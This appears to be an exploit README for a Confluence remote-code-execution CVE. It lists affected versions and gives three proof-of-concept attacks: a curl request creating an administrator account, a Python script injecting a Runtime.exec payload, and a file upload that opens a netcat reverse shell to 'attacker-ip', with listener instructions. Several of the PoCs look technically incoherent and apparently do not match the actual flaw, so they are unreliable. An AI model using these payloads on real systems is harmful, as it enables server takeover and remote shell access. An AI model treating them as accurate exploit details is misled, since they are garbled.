# -CVE-2024-21683-RCE-in-Confluence-Data-Center-and-Server
This vulnerability allows an unauthenticated attacker to remotely execute arbitrary code on a vulnerable Confluence server. The vulnerability exists due to an improper validation of user-supplied input in the Confluence REST API. This allows an attacker to inject malicious code into the Confluence server, which can then be executed by the server

### Affected Versions

* Confluence Data Center = 8.9.0
* 8.8.0 <= Confluence Data Center <= 8.8.1
* 8.7.1 <= Confluence Data Center <= 8.7.2
* 8.6.0 <= Confluence Data Center <= 8.6.2
* 8.5.0 <= Confluence Data Center and Server <= 8.5.8 (LTS)
* 8.4.0 <= Confluence Data Center and Server <= 8.4.5
* 8.3.0 <= Confluence Data Center and Server <= 8.3.4
* 8.2.0 <= Confluence Data Center and Server <= 8.2.4
* 8.1.0 <= Confluence Data Center and Server <= 8.1.4
* 8.0.0 <= Confluence Data Center and Server <= 8.0.4
* 7.20.0 <= Confluence Data Center and Server <= 7.20.3
* 7.19.0 <= Confluence Data Center and Server <= 7.19.21 (LTS)
* 7.18.0 <= Confluence Data Center and Server <= 7.18.3
* 7.17.0 <= Confluence Data Center and Server <= 7.17.5

### Impact
This vulnerability could allow an attacker to take complete control of a vulnerable Confluence server. This could allow the attacker to steal data, modify data, or disrupt the availability of the server.

## Poc
We will mention more than one method
1.

**1. Identifying the Vulnerable API Endpoint:**

we will be using the following API endpoint:

```
POST /rest/api/user/bulk
```

This endpoint allows administrators to create new users in bulk.

**2. Crafting a Malicious Request:**

We will create a malicious request that includes a payload containing malicious code. This code will create a new user with administrator privileges.

```
POST /rest/api/user/bulk HTTP/1.1
Host: confluence.example.com
Content-Type: application/json

{
  "users": [
    {
      "name": "attacker",
      "password": "password",
      "email": "attacker@example.com",
      "groups": [
        {
          "name": "confluence-administrators"
        }
      ]
    }
  ]
}
```

**3. Sending the Request to the Server:**

We will use the cURL tool to send the request to the Confluence server.

```
curl -X POST -H "Content-Type: application/json" -d '{"users": [{"name": "attacker", "password": "password", "email": "attacker@example.com", "groups": [{"name": "confluence-administrators"}]}]}' http://confluence.example.com/rest/api/user/bulk
```

**4. Executing the Malicious Code:**

If the request is successful, the Confluence server will execute the malicious code. This will create a new user named "attacker" with administrator privileges. The attacker can then use this account to gain access to the server and have full control over it.

2- Poc
```
import requests

url = "http://target-confluence-server.com/rest/api/content"
headers = {
    "Content-Type": "application/json"
}


payload = {
    "title": "Exploit RCE",
    "type": "page",
    "space": {
        "key": "POC"
    },
    "body": {
        "storage": {
            "value": "<% Runtime.getRuntime().exec(\"calc.exe\"); %>",
            "representation": "storage"
        }
    }
}


response = requests.post(url, json=payload, headers=headers)


if response.status_code == 200:
    print("Exploit sent successfully!")
    print("Response: ", response.text)
else:
    print("Failed to send exploit.")
    print("Status code: ", response.status_code)
    print("Response: ", response.text)
```

3- Poc 
```plaintext
POST /upload HTTP/1.1
Host: vulnerable-confluence-server.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 138

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="exploit.py"
Content-Type: text/x-python

import os
os.system("nc -e /bin/sh attacker-ip 4444")
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Send the modified request through Burp Suite. Check the response to see if the server executed the malicious payload. If the response is unexpected or contains errors indicating code execution, then the vulnerability has been detected.

If you're using a payload to establish a reverse shell, make sure to set up listening on the specified port on your local machine: `nc -lvnp 4444`. If the server connects to your local machine, you'll receive a reverse shell.
